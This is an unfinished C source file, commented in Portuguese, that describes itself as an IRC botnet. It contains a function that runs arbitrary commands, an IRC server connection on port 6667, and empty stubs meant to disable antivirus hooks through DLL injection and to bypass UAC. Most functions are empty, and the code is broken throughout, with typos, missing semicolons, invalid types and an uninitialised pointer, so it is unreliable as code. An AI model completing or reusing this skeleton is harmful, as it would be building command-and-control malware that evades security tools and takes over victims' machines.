		#include  <stdio.h>
		#include  <stdlib.h>
		#include <windows.h>
		#include  <winsock2.h>
		BOOL DisableHooks(){
		
		
		
		
		
		
		
		
		
		}//desative hooks  dos antivurs Injete uma DLL
		
		void UAC_bypass(){
		
		
		
		
		}//
		
		
		vois
		//Botnet em C 
		char * CmdRun(char *command){
		
		FILE *fp;
		int status;
		char path[PATH_MAX];


	fp = popen(command, "r");
	if (fp == NULL)
		/* Handle error */;


	while (fgets(path, PATH_MAX, fp) != NULL)
		printf("%s", path);


	status = pclose(fp);
	if (status == -1) {
	   
	} else {
	 return NULL;
	}
		
		
		return path;
		
		
		}
		typedef struct IRCsocket{
		SOCKET socket;
		
		
		
		
		}IRCsocket,*PIRCsocket
		VOID Callbot(IRCsocket *irc){
		
		
		
		}//bot conversa e en
		
		
		*IRCsocket ConectIrcServer( char *server){
		
		SOCKADDR_IN  serverInfo;
		WSADATA wsa;
		LPHOSTENT entry;
		if(WSAStartup(MAKEWORD(2,2),&wsa)==1){
		
		return  -1;}
		if(!(entry=gethostbyname(server))){
		
		  WSACleanup();
        return (-1);
		
		
		}
		IRCsocket *irc;
		irc->socket=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		
		if(irc->socket==INVALID_SOCKET){
		
		
		return NULL;}
		
		serverInfo.sin_family = AF_INET;
		serverInfo.sin_addr= *((LPIN_ADDR)*entry->h_addr_list);
		
		serverInfo.sin_port=htons(6667);
		
		if(connect(irc->socket,(LPSOCKADDR)&serverInfo, sizeof(struct sockaddr)) == SOCKET_ERROR){
		
		
		  WSACleanup();
        return (-1);
		}
		
		return IRCsocket;
		}/retorna uma estrutura com socket conectado a rede
		VOID IrcBot( IRCsocket  *conn){
		
		
		
		
		
		
		
		}//Receber e enviar mensagens  recebe  